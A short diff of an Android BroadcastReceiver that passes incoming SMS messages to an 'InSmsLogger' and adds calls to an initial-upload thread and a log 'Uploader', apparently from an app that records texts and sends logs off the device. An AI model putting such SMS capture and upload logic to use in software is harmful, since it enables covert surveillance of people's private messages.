@@ -17,9 +17,14 @@ public class GeneralBroadcastReceiver extends BroadcastReceiver {
     public void onReceive(Context context, Intent intent) {
         String action = intent.getAction();
         Logger.d("GeneralBroadcastReceiver received action: " + action);
-        
+                
         if (action.equals("android.provider.Telephony.SMS_RECEIVED")) {
             new InSmsLogger(context, intent.getExtras()).start();
+            return;
+        }
+        
+        if (action.equals(This.ACTION_INITIAL_UPLOAD)) {
+            new InitialUploadThread(context).start();
             return;
         }
         
@@ -34,6 +39,7 @@ public class GeneralBroadcastReceiver extends BroadcastReceiver {
         }
         
         if (action.equals(This.ACTION_UPLOAD_LOGS)) {
+            new Uploader(context).start();
             return;
         }
         
